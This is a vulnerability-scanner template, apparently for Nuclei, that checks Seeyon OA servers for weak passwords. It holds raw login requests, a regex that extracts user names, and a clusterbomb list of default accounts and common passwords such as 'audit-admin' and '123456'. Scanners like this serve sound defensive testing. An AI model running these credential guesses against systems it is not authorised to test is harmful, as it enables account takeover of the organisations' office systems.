id: seeyon-oa-weak-password
info:
  name: Seeyon OA Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: resource-management-error
  description: |
    This template detects weak passwords in Seeyon OA authentication mechanism.
http:
  - raw:
      - |
        POST /seeyon/rest/authentication/ucpcLogin?login_username=n0tf0und&login_password=n0tf0und&ticket= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '\"LoginOK\":\"fail\"')
    extractors:
      - type: regex
        name: valid-users
        internal: true
        group: 1
        regex:
          - "(?<=\"loginName\":\")([a-zA-Z0-9._-]+)"
  - raw:
      - |
        POST /seeyon/rest/authentication/ucpcLogin?login_username={{username}}&login_password={{password}}&ticket= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    payloads:
      username:
        - seeyon-guest
        - system
        - audit-admin
        - group-admin
      password:
        - share.do
        - genericController.do
        - 123456
        - admin123
    attack: clusterbomb
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '\"LoginOK\":\"OK\"')
          - contains(body, '\"loginName\"')
